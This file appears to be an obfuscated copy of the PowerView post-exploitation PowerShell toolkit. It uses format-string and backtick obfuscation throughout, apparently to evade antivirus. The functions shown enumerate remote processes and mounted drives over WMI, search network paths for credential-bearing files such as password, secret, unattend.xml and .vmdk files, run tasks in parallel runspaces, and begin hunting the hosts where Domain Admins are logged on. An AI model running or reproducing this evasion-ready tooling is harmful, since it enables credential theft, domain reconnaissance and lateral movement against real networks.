                            ${R`emote`pa`Th} = ${r`eG}.("{4}{1}{3}{0}{2}" -f 'Valu','et','e','String','G').Invoke(${h`KU}, "$UserSID\Network\$DriveLetter", ("{1}{2}{0}" -f 'otePath','R','em'))."s`VaLUe"
                            ${d`RI`VEu`s`ername} = ${R`EG}.("{1}{3}{2}{0}" -f'ingValue','Ge','r','tSt').Invoke(${h`kU}, "$UserSID\Network\$DriveLetter", ("{0}{2}{1}" -f'Us','e','erNam'))."s`VaL`UE"
                            if (-not ${uS`ERname}) { ${U`sEr`NAME} = '' }

                            if (${ReM`OT`epAth} -and (${R`EmotEPa`TH} -ne '')) {
                                ${Mo`Unt`EDDR`ivE} = &("{0}{2}{1}"-f 'Ne','-Object','w') ("{0}{1}" -f'PSO','bject')
                                ${mou`NTEdd`RI`VE} | &("{0}{2}{1}" -f 'Add-Me','ber','m') ("{2}{1}{0}{3}" -f 'ro','tep','No','perty') ("{1}{0}{2}{3}"-f 'r','Compute','Nam','e') ${Co`mpuT`Er}
                                ${MouNted`dr`i`Ve} | &("{2}{1}{3}{0}" -f'ember','d','A','d-M') ("{1}{3}{2}{0}"-f'y','N','ropert','otep') ("{2}{1}{0}"-f 'ame','erN','Us') ${uS`eRNAMe}
                                ${moUN`Te`Dd`RI`Ve} | &("{3}{2}{1}{0}" -f 'mber','Me','-','Add') ("{3}{1}{2}{0}"-f 'property','ot','e','N') ("{2}{0}{1}"-f'serS','ID','U') ${useR`s`ID}
                                ${mO`UN`TEddRiVe} | &("{0}{1}{2}"-f 'Add','-M','ember') ("{3}{2}{0}{1}"-f'o','perty','epr','Not') ("{1}{0}{3}{2}"-f 'ive','Dr','er','Lett') ${Dri`VeLE`T`TER}
                                ${mOu`Nt`eD`DrIVE} | &("{3}{0}{2}{1}" -f '-M','er','emb','Add') ("{1}{2}{0}" -f 'roperty','Not','ep') ("{0}{3}{1}{2}" -f'Pro','am','e','viderN') ${pr`o`ViDE`RN`AmE}
                                ${Mou`Nt`eD`dr`iVe} | &("{2}{0}{1}"-f'-','Member','Add') ("{2}{0}{1}" -f'opert','y','Notepr') ("{2}{3}{0}{1}" -f 'ote','Path','Re','m') ${r`eMoT`EpATH}
                                ${MO`UNTEdd`R`I`Ve} | &("{2}{1}{0}"-f 'ber','Mem','Add-') ("{3}{2}{1}{0}"-f 'operty','r','ep','Not') ("{0}{2}{1}"-f'DriveUserN','e','am') ${DrIveUSE`R`NaMe}
                                ${MoU`NtEd`Dr`i`Ve}."pSOBJe`ct"."Ty`PENAM`ES".("{0}{1}"-f'Ins','ert').Invoke(0, ("{5}{1}{2}{3}{0}{4}" -f 'Dri','werV','iew.','RegMounted','ve','Po'))
                                ${mo`UntE`d`dRIVE}
                            }
                        }
                    }
                    catch {
                        &("{1}{3}{0}{2}{4}" -f '-Ve','Wri','rb','te','ose') ('['+'Ge'+'t-WMI'+'Reg'+'Mounted'+'Driv'+'e] '+'Er'+'ror:'+' '+"$_")
                    }
                }
            }
            catch {
                &("{1}{0}{2}{3}" -f 'e-W','Writ','a','rning') ('[Ge'+'t'+'-'+'WMIRegMountedD'+'rive] '+'E'+'rror '+'a'+'c'+'cessi'+'ng '+"$Computer, "+'like'+'l'+'y '+'insu'+'fficient'+' '+'pe'+'rmiss'+'io'+'ns '+'o'+'r '+'fi'+'rew'+'a'+'ll '+'rules'+' '+'on'+' '+'h'+'ost: '+"$_")
            }
        }
    }
}


function Ge`T-wmiPr`OcEss {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{1}{4}{0}" -f's','ce','ldPro','PSShou','s'}, '')]
    [OutputType({"{2}{6}{4}{1}{5}{0}{3}" -f 'c','er','PowerV','ess','s','Pro','iew.U'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSItIOn = 0, vALUEFroMpIPElINE = ${T`RUE}, VAluefRoMPipEliNeByProperTYnAme = ${tR`Ue})]
        [Alias({"{0}{1}{2}"-f'H','ostNam','e'}, {"{0}{3}{1}{2}"-f'd','host','name','ns'}, {"{1}{0}"-f 'ame','n'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${co`Mp`UtE`RNaMe} = ("{0}{1}{2}" -f 'l','ocal','host'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`D`enT`iaL} =  ${7`TQ02}::"e`mpty"
    )

    PROCESS {
        ForEach (${C`oMPu`TEr} in ${cOmpu`TeR`Na`Me}) {
            try {
                ${wMIARGUmE`N`Ts} = @{
                    ("{2}{0}{3}{1}" -f 'p','erName','Com','ut') = ${cOmpUt`e`R`NAME}
                    ("{0}{1}" -f'Clas','s') = ("{3}{1}{2}{4}{0}"-f 'ss','in32','_proc','W','e')
                }
                if (${PsBoUnD`paraMe`T`E`Rs}[("{0}{2}{1}" -f 'Cred','l','entia')]) { ${WM`Ia`R`g`UMEnTs}[("{2}{1}{0}" -f'al','edenti','Cr')] = ${Cr`Ed`entIAl} }
                &("{0}{3}{4}{1}{2}" -f 'Get-','je','ct','WMI','ob') @WmiArguments | &("{3}{2}{0}{1}"-f'ec','t','j','ForEach-Ob') {
                    ${ow`N`er} = ${_}.("{1}{0}{2}"-f 'town','ge','er').Invoke();
                    ${pRo`ce`sS} = &("{0}{2}{3}{1}" -f 'Ne','ct','w-','Obje') ("{1}{2}{0}"-f'ct','PSObj','e')
                    ${p`ROc`eSS} | &("{0}{1}{2}" -f 'Add-M','e','mber') ("{1}{0}{3}{2}" -f'epr','Not','rty','ope') ("{3}{0}{1}{2}"-f 'omput','e','rName','C') ${COmP`U`TER}
                    ${PR`O`CEsS} | &("{2}{0}{1}" -f 'd-M','ember','Ad') ("{0}{2}{3}{1}"-f 'N','property','o','te') ("{1}{3}{2}{0}" -f'e','Pr','am','ocessN') ${_}."pR`o`CEsSnA`Me"
                    ${Pro`CesS} | &("{0}{1}{2}" -f 'Add-','Mem','ber') ("{0}{2}{3}{1}"-f 'Not','y','ep','ropert') ("{0}{2}{1}"-f 'Proc','D','essI') ${_}."PRo`cE`sSId"
                    ${P`ROC`esS} | &("{0}{1}{2}"-f 'Ad','d-Mem','ber') ("{2}{0}{1}" -f'p','erty','Notepro') ("{2}{0}{1}" -f 'ma','in','Do') ${Ow`NER}."d`o`mAIN"
                    ${p`RO`CEsS} | &("{2}{1}{0}" -f 'd-Member','d','A') ("{0}{3}{1}{2}" -f'Not','proper','ty','e') ("{1}{0}"-f'r','Use') ${ow`NeR}."Us`eR"
                    ${pRO`ce`ss}."pS`O`BJeCT"."tY`p`ENamEs".("{1}{0}" -f 't','Inser').Invoke(0, ("{2}{3}{1}{0}"-f'cess','erPro','PowerView','.Us'))
                    ${p`R`OCESS}
                }
            }
            catch {
                &("{0}{2}{1}"-f 'Write-','e','Verbos') ('[Get-WMIPro'+'ces'+'s]'+' '+'Error'+' '+'enume'+'ratin'+'g'+' '+'r'+'e'+'mote '+'p'+'roc'+'esse'+'s '+'on'+' '+"'$Computer', "+'ac'+'cess'+' '+'like'+'ly '+'d'+'enie'+'d: '+"$_")
            }
        }
    }
}


function f`I`N`D-inTereSt`iNGfI`LE {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{0}{1}{2}" -f 'ce','s','s','o','PSShouldPr'}, '')]
    [OutputType({"{1}{3}{0}{4}{5}{2}"-f 'w','Powe','dFile','rVie','.','Foun'})]
    [CmdletBinding(DeFAULTPaRaMETersEtnaME = {"{1}{2}{0}{3}"-f 'cifi','Fi','leSpe','cation'})]
    Param(
        [Parameter(poSiTIOn = 0, VAlUEFROmPipELINe = ${T`Rue}, ValueFrOmpiPELiNeBypROpERtYNAMe = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`Ath} = '.\',

        [Parameter(ParAmetErsEtnAmE = "FiLESPe`Ci`FiC`AtIOn")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}"-f 'S','rchTe','rms','ea'}, {"{0}{1}" -f'Te','rms'})]
        [String[]]
        ${i`NcL`UdE} = @(("{2}{0}{1}" -f 'wor','d*','*pass'), ("{3}{1}{2}{0}"-f 'tive*','s','i','*sen'), ("{0}{1}"-f'*adm','in*'), ("{2}{1}{0}" -f'ogin*','l','*'), ("{0}{2}{1}"-f'*s','et*','ecr'), ("{0}{2}{1}" -f 'u','ttend*.xml','na'), ("{1}{0}" -f'dk','*.vm'), ("{2}{0}{1}" -f 'ds','*','*cre'), ("{2}{3}{1}{0}"-f'tial*','eden','*','cr'), ("{1}{0}{2}" -f '.conf','*','ig')),

        [Parameter(parAmetERSeTName = "fi`l`e`SPEcI`FIC`ATIOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LAStacC`Es`S`TImE},

        [Parameter(paRAMEterSETnamE = "F`il`esp`EciFI`cATIOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${LaS`TW`RI`Tet`Ime},

        [Parameter(PaRAMETeRSeTnAme = "F`il`ESp`EC`ifi`cAtIOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${cR`e`At`Io`NTimE},

        [Parameter(pARAMETERSeTNAme = "O`FfiCed`OCs")]
        [Switch]
        ${OffIce`dO`CS},

        [Parameter(paRAmETErsetNAme = "f`Re`SHe`XES")]
        [Switch]
        ${fRes`HE`XeS},

        [Parameter(paRaMETERsETNAME = "F`iLEs`pECif`iCatI`oN")]
        [Switch]
        ${ExcL`Ud`EFO`LDerS},

        [Parameter(pAraMETErSEtNamE = "FIlES`P`ecIFI`catiON")]
        [Switch]
        ${e`X`cluDEh`iddeN},

        [Switch]
        ${checkWRi`TE`AC`cESS},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`DEn`TI`AL} =   ${7t`q02}::"Emp`TY"
    )

    BEGIN {
        ${sEarChER`A`Rg`U`menTs} =  @{
            ("{0}{1}{2}"-f 'Re','c','urse') = ${T`RUE}
            ("{0}{2}{1}"-f 'ErrorA','on','cti') = ("{2}{1}{3}{0}"-f'yContinue','lent','Si','l')
            ("{0}{1}{2}" -f'Inc','lud','e') = ${I`NcLu`De}
        }
        if (${PsbO`UNdpA`Rame`Te`Rs}[("{2}{1}{0}" -f'ocs','D','Office')]) {
            ${Se`ArCHe`RarGUm`entS}[("{0}{1}"-f'Inc','lude')] = @(("{0}{1}" -f'*.d','oc'), ("{0}{1}"-f'*.d','ocx'), ("{0}{1}"-f '*','.xls'), ("{0}{1}" -f'*.xls','x'), ("{0}{1}"-f'*.p','pt'), ("{2}{0}{1}"-f'p','tx','*.p'))
        }
        elseif (${pSBOu`NdPaRA`mEte`Rs}[("{1}{3}{2}{0}" -f 'EXEs','Fre','h','s')]) {
            
            ${LAsTA`cc`eSST`ImE} = (&("{0}{2}{1}"-f'G','Date','et-')).("{0}{1}{2}" -f'A','ddDay','s').Invoke(-7).("{1}{2}{0}"-f'ring','T','oSt').Invoke(("{2}{1}{0}" -f'yy','y','MM/dd/y'))
            ${SeARC`H`ErA`R`gUMe`NTS}[("{0}{2}{1}"-f'Inc','e','lud')] = @(("{1}{0}"-f '.exe','*'))
        }
        ${SEARcHe`RA`RgUM`E`Nts}[("{1}{0}" -f 'ce','For')] = -not ${PsBOun`DpA`RAMet`e`Rs}[("{1}{0}{3}{2}"-f'eHi','Exclud','n','dde')]

        ${MappeDcO`MPuTE`RS} = @{}

        function TEST-`W`RitE {
            
            [CmdletBinding()]Param([String]${pA`TH})
            try {
                ${FiL`e`TEsT} =   ( Get-VARiAble ('n'+'ot0')  -Va )::("{0}{1}" -f 'Open','Write').Invoke(${Pa`Th})
                ${fIlE`T`Est}.("{1}{0}" -f'ose','Cl').Invoke()
                ${t`RUE}
            }
            catch {
                ${fa`LSe}
            }
        }
    }

    PROCESS {
        ForEach (${TAr`gE`TpAtH} in ${P`ATh}) {
            if ((${tA`R`geTPA`TH} -Match ((("{4}{1}{0}{3}{2}" -f '{0','}.*','0}.*','}{','{0}{0}{0}{0'))-F  [cHAR]92)) -and (${Psb`OUN`dpARAmetE`RS}[("{0}{1}{2}"-f 'Cr','edent','ial')])) {
                ${hOs`Tc`OM`pUTEr} = (&("{1}{2}{0}" -f'ct','Ne','w-Obje') ("{0}{2}{1}"-f'Syst','ri','em.U')(${TaRG`eTp`ATH}))."H`Ost"
                if (-not ${m`Ap`p`edC`OmpUteRs}[${hOSTC`oMp`UteR}]) {
                    
                    &("{1}{3}{4}{0}{2}"-f'moteConnecti','Ad','on','d-','Re') -ComputerName ${hO`sTCoMp`U`Ter} -Credential ${CrE`DE`NtIaL}
                    ${MaPp`e`D`coMP`UT`Ers}[${Ho`StcO`mpUteR}] = ${tR`UE}
                }
            }

            ${se`ARC`HErar`G`UmENts}[("{1}{0}" -f 'h','Pat')] = ${Tar`GeT`PATh}
            &("{1}{0}{3}{2}"-f'et','G','ChildItem','-') @SearcherArguments | &("{0}{1}{2}"-f'ForEac','h-Ob','ject') {
                
                ${Co`NT`INue} = ${tr`Ue}
                if (${pSBoUndpA`R`AME`TeRs}[("{1}{2}{0}"-f's','ExcludeFold','er')] -and (${_}."p`sisco`N`Tainer")) {
                    &("{0}{3}{2}{1}{4}" -f'Write-Ve','os','b','r','e') "Excluding: $($_.FullName) "
                    ${coN`TInUE} = ${fa`lSE}
                }
                if (${lA`STaCC`e`sStIME} -and (${_}."lA`st`A`c`cesSTIMe" -lt ${LA`st`Acc`E`SstIMe})) {
                    ${c`o`NTinue} = ${F`A`lSe}
                }
                if (${pSbOu`Nd`PA`R`AmE`TERS}[("{0}{1}{3}{2}" -f 'LastW','rit','ime','eT')] -and (${_}."Las`T`WRiTe`T`iMe" -lt ${La`StwR`it`ETimE})) {
                    ${Co`N`Tin`Ue} = ${F`AlSE}
                }
                if (${p`sboUnD`pArame`T`ERS}[("{0}{2}{3}{1}"-f 'Crea','e','t','ionTim')] -and (${_}."CrEATi`ONT`I`me" -lt ${CrE`AtiOnT`i`mE})) {
                    ${C`O`NTIN`UE} = ${F`ALSe}
                }
                if (${PSBO`Un`D`PARaME`TeRs}[("{1}{2}{0}"-f'ess','CheckW','riteAcc')] -and (-not (&("{0}{1}{2}" -f 'Test-Wr','i','te') -Path ${_}."f`UL`lNaMe"))) {
                    ${co`NtIN`UE} = ${fAL`se}
                }
                if (${Conti`NuE}) {
                    ${f`iLeP`AraMs} = @{
                        ("{0}{1}"-f 'Pat','h') = ${_}."f`U`LlNAME"
                        ("{0}{1}"-f 'Owne','r') = $((&("{0}{2}{1}" -f'Ge','Acl','t-') ${_}."F`ULlnAmE")."o`WNeR")
                        ("{0}{1}{2}" -f 'LastAcc','ess','Time') = ${_}."La`S`T`Ac`ceSstimE"
                        ("{1}{0}{2}" -f'Write','Last','Time') = ${_}."LaStW`Ri`TE`Time"
                        ("{1}{2}{0}{3}" -f'n','Creat','io','Time') = ${_}."cr`e`At`IONtimE"
                        ("{1}{0}" -f 'ength','L') = ${_}."LEnG`TH"
                    }
                    ${fO`Un`DfI`lE} = &("{0}{2}{1}"-f 'New-Obj','ct','e') -TypeName ("{0}{1}{2}"-f 'PSO','bjec','t') -Property ${f`Il`EPArAmS}
                    ${F`ou`NDfiLe}."p`so`BJEcT"."tYPen`A`MeS".("{2}{1}{0}" -f 'rt','se','In').Invoke(0, ("{4}{2}{3}{1}{0}" -f'le','ew.FoundFi','e','rVi','Pow'))
                    ${foU`NDF`ilE}
                }
            }
        }
    }

    END {
        
        ${MAp`P`eDComp`UTe`RS}."K`eys" | &("{2}{1}{0}{3}" -f'on','emove-RemoteC','R','nection')
    }
}








function ne`W-THRE`Ad`E`DfuNCtIon {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{0}{8}{7}{2}{1}{5}{4}{3}{9}" -f'Us','sForState','es','nc','gingFu','Chan','PS','houldProc','eS','tions'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(PoSItIOn = 0, MANDatoRY = ${TR`Ue}, VALUefrompipeLine = ${tr`Ue}, vALuEfrompIpELiNebyProperTYNAme = ${Tr`UE})]
        [String[]]
        ${CoMP`UTEr`Na`me},

        [Parameter(POSItioN = 1, mandAtORY = ${tR`UE})]
        [System.Management.Automation.ScriptBlock]
        ${S`c`RiptBLoCK},

        [Parameter(pOsItiON = 2)]
        [Hashtable]
        ${scr`ip`TpAr`AmE`TeRS},

        [Int]
        [ValidateRange(1,  100)]
        ${T`HR`EADS} = 20,

        [Switch]
        ${N`oi`mp`orTS}
    )

    BEGIN {
        
        
        ${ses`SION`STa`Te} =  ( gCi  ("{2}{1}{0}{3}"-f 'E:461b','bl','VarIA','pD'))."v`AlUE"::("{1}{3}{2}{0}"-f't','Cr','Defaul','eate').Invoke()

        
        
        ${SE`SsIONST`ATE}."apaRTm`EN`TsT`ATE" =   ( gET-vARiABLE  ("{1}{0}" -f'BR','iL1'))."va`LUE"::"s`Ta"

        
        
        if (-not ${NOi`mP`orTS}) {
            
            ${MYv`Ars} = &("{2}{0}{3}{1}" -f'et-Var','able','G','i') -Scope 2

            
            ${vOrB`idD`eNvArs} = @('?',("{0}{1}"-f'a','rgs'),("{4}{2}{1}{0}{3}" -f'm','a','eN','e','ConsoleFil'),("{0}{1}"-f 'E','rror'),("{3}{2}{0}{1}"-f'Co','ntext','ution','Exec'),("{1}{0}" -f'e','fals'),("{0}{1}"-f'HOM','E'),("{1}{0}" -f't','Hos'),("{0}{1}" -f'in','put'),("{0}{1}{2}"-f 'In','putObjec','t'),("{0}{4}{2}{3}{1}"-f'MaximumAlias','t','ou','n','C'),("{2}{3}{4}{1}{0}"-f 'nt','u','M','aximumDr','iveCo'),("{2}{4}{1}{0}{3}"-f'Coun','or','Max','t','imumErr'),("{1}{4}{3}{2}{0}{5}" -f 'oun','Maximu','nC','nctio','mFu','t'),("{2}{3}{0}{1}{4}" -f'Hi','story','Maxi','mum','Count'),("{2}{0}{1}{3}" -f 'xim','umVariableCou','Ma','nt'),("{0}{1}{3}{2}"-f'MyIn','vo','tion','ca'),("{0}{1}"-f 'nul','l'),'PID',("{0}{1}{5}{3}{4}{2}" -f'PSBou','ndPa','rs','am','ete','r'),("{2}{0}{1}{3}"-f 'omm','andP','PSC','ath'),("{1}{0}" -f'ulture','PSC'),("{1}{0}{6}{3}{2}{4}{5}"-f'fa','PSDe','ara','ltP','m','eterValues','u'),("{2}{0}{1}"-f'S','HOME','P'),("{3}{1}{0}{2}"-f'oo','tR','t','PSScrip'),("{2}{1}{0}" -f'e','UICultur','PS'),("{0}{3}{2}{4}{1}"-f 'PSVersi','le','Ta','on','b'),'PWD',("{1}{0}" -f 'hellId','S'),("{2}{1}{0}" -f'sh','onizedHa','Synchr'),("{0}{1}" -f 'tru','e'))

            
            ForEach (${V`Ar} in ${MYV`Ars}) {
                if (${v`orb`idden`VaRs} -NotContains ${v`Ar}."N`AME") {
                ${sessi`o`NstaTE}."V`ARi`Abl`es".("{1}{0}"-f'd','Ad').Invoke((&("{2}{0}{1}" -f '-Obj','ect','New') -TypeName ("{2}{14}{6}{12}{7}{10}{4}{15}{13}{17}{3}{9}{5}{1}{11}{16}{8}{0}" -f'y','V','S','paces.Sess','ent.','te','tem','e','ntr','ionSta','m','ariabl','.Manag','mation.R','ys','Auto','eE','uns') -ArgumentList ${v`Ar}."n`AmE",${V`AR}."VAl`Ue",${v`AR}."Des`c`RiPTIon",${V`AR}."OPTI`o`Ns",${V`AR}."ATTRi`B`Ut`es"))
                }
            }

            
            ForEach (${fu`NCT`ion} in (&("{0}{1}{2}" -f'Get-ChildI','te','m') ("{0}{2}{1}" -f'Func','ion:','t'))) {
                ${ses`SIo`Ns`Ta`TE}."Co`Mma`NDS".("{1}{0}" -f'dd','A').Invoke((&("{2}{0}{1}"-f'ec','t','New-Obj') -TypeName ("{9}{11}{14}{12}{1}{0}{8}{15}{13}{3}{7}{2}{4}{5}{10}{6}"-f'ion','at','ta','sion','t','eF','onEntry','S','.','S','uncti','yst','t.Autom','es.Ses','em.Managemen','Runspac') -ArgumentList ${f`UnctI`oN}."n`AmE", ${fU`NC`TIoN}."DEfIN`iT`IoN"))
            }
        }

        
        
        

        
        ${p`OOL} =   (variaBLE ("{1}{0}" -f 'B','nuq')  -valUEo  )::("{1}{0}{3}{2}"-f'unspac','CreateR','Pool','e').Invoke(1, ${Thr`E`ADs}, ${Se`S`sioNSt`ATE}, ${H`oST})
        ${pO`Ol}.("{1}{0}"-f'en','Op').Invoke()

        
        ${METh`OD} = ${n`ULL}
        ForEach (${M} in   (dir  ('VARIaBL'+'e:R'+'Dnf1'+'g')  )."V`ALue".("{1}{0}{2}"-f 'tMethod','Ge','s').Invoke() | &("{1}{0}{2}"-f'b','Where-O','ject') { ${_}."n`AME" -eq ("{0}{2}{1}{3}" -f'Begi','nv','nI','oke') }) {
            ${MEth`o`DP`Ara`mEtErs} = ${m}.("{0}{1}{2}" -f'Ge','tPa','rameters').Invoke()
            if ((${mE`Tho`d`PARA`mETErs}."c`OunT" -eq 2) -and ${mE`ThODpARA`MeTE`Rs}[0]."n`Ame" -eq ("{1}{0}" -f 't','inpu') -and ${Me`TH`Odp`AraME`TeRS}[1]."na`Me" -eq ("{0}{1}" -f'out','put')) {
                ${mET`H`oD} = ${m}."MA`KEgEnEri`C`MEt`H`OD"([Object], [Object])
                break
            }
        }

        ${j`oBs} = @()
        ${C`O`MP`UteRNAME} = ${com`puT`erNaMe} | &("{0}{1}{2}"-f'Wh','ere-Objec','t') {${_} -and ${_}.("{0}{1}"-f'T','rim').Invoke()}
        &("{2}{1}{3}{0}"-f 'rbose','ite','Wr','-Ve') "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        
        if (${THR`eA`Ds} -ge ${C`OMputer`NAMe}."LEng`Th") {
            ${Th`ReA`ds} = ${CO`M`PUte`Rn`AmE}."le`NgTH"
        }
        ${ele`me`Ntsplit`si`Ze} = [Int](${CoMPuTeRN`A`me}."l`EN`gtH"/${T`HREadS})
        ${coMPuT`e`RNamEpA`RTI`TIONeD} = @()
        ${sT`Art} = 0
        ${E`Nd} = ${el`eMenTS`Pl`Its`I`ZE}

        for(${i} = 1; ${i} -le ${th`REa`Ds}; ${I}++) {
            ${lI`st} = &("{0}{2}{1}" -f 'Ne','ct','w-Obje') ("{5}{2}{6}{3}{7}{1}{0}{4}" -f 'rrayL','s.A','m','ollec','ist','Syste','.C','tion')
            if (${I} -eq ${T`hr`EADS}) {
                ${e`ND} = ${CompU`TER`NA`me}."L`ength"
            }
            ${l`iSt}."A`D`dRanGE"(${COM`P`UTeRnAme}[${stA`RT}..(${E`ND}-1)])
            ${Sta`RT} += ${e`lEM`eNtsPL`ITS`iZe}
            ${e`ND} += ${e`l`emeN`TS`PLitSI`zE}
            ${Co`mpUTE`R`N`AMEpaRTI`TIONed} += @(,@(${lI`st}.("{1}{0}" -f 'ray','ToAr').Invoke()))
        }

        &("{1}{0}{2}{3}{4}"-f 'it','Wr','e-Ve','rbo','se') ('[Ne'+'w-Thre'+'adedFun'+'c'+'tion] '+'To'+'ta'+'l '+'num'+'b'+'er '+'o'+'f '+'t'+'h'+'re'+'ads/parti'+'tions: '+"$Threads")

        ForEach (${Co`mP`UteRn`Am`e`paRTitI`On} in ${co`M`PuTeR`Namep`ArT`ItI`onEd}) {
            
            ${powerS`H`ElL} =  ( iteM ("{2}{1}{3}{0}{4}"-f '1','E:RDn','VarIabL','F','g'))."v`AluE"::("{1}{0}" -f'eate','Cr').Invoke()
            ${po`w`erSh`Ell}."ru`N`spACepool" = ${pO`Ol}

            
            ${nu`lL} = ${POWE`R`shElL}.("{1}{2}{0}"-f 't','AddSc','rip').Invoke(${sc`RI`pt`BLOcK}).("{0}{1}{2}"-f 'Add','P','arameter').Invoke(("{3}{0}{1}{2}"-f'put','e','rName','Com'), ${C`OMP`UTErNA`mE`pA`RTi`Tion})
            if (${sC`RIPT`pA`Ra`M`EteRs}) {
                ForEach (${P`A`RaM} in ${ScR`iPT`PARA`metE`Rs}.("{0}{1}{2}" -f'GetEnumer','a','tor').Invoke()) {
                    ${nu`Ll} = ${po`wER`ShE`lL}.("{1}{3}{0}{2}" -f'mete','A','r','ddPara').Invoke(${P`ArAM}."N`AME", ${pAR`AM}."val`Ue")
                }
            }

            
            ${O`UTput} = &("{1}{2}{0}{3}" -f 'je','New','-Ob','ct') ("{9}{3}{2}{5}{10}{7}{8}{6}{12}{13}{4}{1}{0}{11}" -f 'ject','n[Ob','uto','.A','io','mati','ta','n.PS','Da','Management','o',']','Col','lect')

            
            ${j`Obs} += @{
                ('PS') = ${p`oWeRs`hEll}
                ("{2}{1}{0}"-f'ut','utp','O') = ${ouT`put}
                ("{0}{1}" -f 'Resul','t') = ${MeT`hod}."I`NvoKe"(${pO`W`erShE`ll}, @(${N`UlL}, [Management.Automation.PSDataCollection[Object]]${Ou`TpUt}))
            }
        }
    }

    END {
        &("{2}{3}{1}{0}"-f 'e','rbos','Writ','e-Ve') ("{0}{6}{3}{1}{5}{4}{2}{7}"-f'[New-T','dedFunction] Th','t','rea','ads execu','re','h','ing')

        
        Do {
            ForEach (${j`Ob} in ${Jo`BS}) {
                ${J`ob}."oU`TpUT".("{0}{1}{2}"-f'Rea','d','All').Invoke()
            }
            &("{0}{3}{1}{2}" -f'S','Sle','ep','tart-') -Seconds 1
        }
        While ((${Jo`BS} | &("{0}{1}{2}"-f'Where-','O','bject') { -not ${_}."RES`U`Lt"."isC`OM`P`letED" })."COu`NT" -gt 0)

        ${Sl`e`EPse`cONDS} = 100
        &("{0}{2}{1}" -f 'Write-Verbo','e','s') ('['+'New-'+'T'+'hread'+'edF'+'uncti'+'on]'+' '+'W'+'aitin'+'g '+"$SleepSeconds "+'se'+'con'+'ds '+'fo'+'r '+'fi'+'nal '+'c'+'lean'+'up...')

        
        for (${i}=0; ${i} -lt ${sLee`p`se`CondS}; ${I}++) {
            ForEach (${J`ob} in ${J`Obs}) {
                ${J`oB}."O`UtpUT".("{1}{0}" -f'l','ReadAl').Invoke()
                ${j`OB}."pS".("{2}{0}{1}"-f 'po','se','Dis').Invoke()
            }
            &("{1}{0}{2}"-f 'r','Sta','t-Sleep') -S 1
        }

        ${P`OOL}.("{0}{1}{2}" -f 'D','ispos','e').Invoke()
        &("{0}{2}{1}{3}" -f 'W','os','rite-Verb','e') ("{9}{8}{1}{10}{11}{0}{3}{6}{5}{2}{7}{4}"-f'n','ea','hrea','ct','s completed',' all t','ion]','d','w-Thr','[Ne','de','dFu')
    }
}


function fiNd-`DOmA`InUsErLocAtI`on {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{1}{2}{0}" -f 'ldProcess','o','u','Sh','PS'}, '')]
    [OutputType({"{6}{1}{5}{3}{2}{0}{4}"-f'cati','Vi','serLo','.U','on','ew','Power'})]
    [CmdletBinding(DefAuLTpAraMETeRSeTName = {"{2}{0}{3}{1}"-f'serGroupI','tity','U','den'})]
    Param(
        [Parameter(pOsitIOn = 0, vAluefROMpiPELiNe = ${T`RUe}, VALUeFroMpipeLinEbyPropERtYNaMe = ${Tr`UE})]
        [Alias({"{0}{3}{2}{1}"-f'D','ame','ostN','NSH'})]
        [String[]]
        ${COmpU`Te`R`N`AmE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`o`mAiN},

        [ValidateNotNullOrEmpty()]
        [String]
        ${CoM`pU`T`eRDoMain},

        [ValidateNotNullOrEmpty()]
        [String]
        ${cOMpU`TE`Rl`daPFilt`ER},

        [ValidateNotNullOrEmpty()]
        [String]
        ${c`oMPUTErsEa`RChb`Ase},

        [Alias({"{2}{0}{1}{3}"-f'nconstr','ai','U','ned'})]
        [Switch]
        ${CO`mpuT`e`Run`ConSt`RaI`NeD},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{2}" -f 'ratingSy','s','tem','Ope'})]
        [String]
        ${c`oM`pU`TE`R`O`pe`RatINGSYStem},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'Servi','cePa','ck'})]
        [String]
        ${c`omp`UterSe`RViCEpACK},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{0}{1}"-f'iteN','ame','S'})]
        [String]
        ${cOM`PU`TeRsIT`eNA`me},

        [Parameter(PARameTERsETnamE = "uSE`RI`DenTITY")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${UsER`I`De`NTItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${U`SeRdoMA`in},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USErldap`F`iLtEr},

        [ValidateNotNullOrEmpty()]
        [String]
        ${USErSEA`R`chB`A`SE},

        [Parameter(paRaMeteRseTNAMe = "usERGRo`UP`ID`eN`TITy")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f 'pName','rou','G'}, {"{1}{0}" -f'p','Grou'})]
        [String[]]
        ${USERG`R`oU`pident`i`Ty} = ("{0}{1}{2}"-f 'Domain',' A','dmins'),

        [Alias({"{2}{1}{3}{0}" -f'nt','inCo','Adm','u'})]
        [Switch]
        ${usE`R`AD`mInCOuNt},

        [Alias({"{4}{0}{1}{3}{2}"-f 'lowDele','g','on','ati','Al'})]
        [Switch]
        ${usERAlLow`De`leGAT`I`oN},

        [Switch]
        ${chEcka`CC`e`SS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{4}{0}{2}" -f'tro','Dom','ller','ainCo','n'})]
        [String]
        ${Se`R`VeR},

        [ValidateSet({"{0}{1}"-f 'Bas','e'}, {"{2}{0}{1}"-f'neL','evel','O'}, {"{0}{1}"-f'Subt','ree'})]
        [String]
        ${SeArCHs`Co`PE} = ("{2}{0}{1}"-f 't','ree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
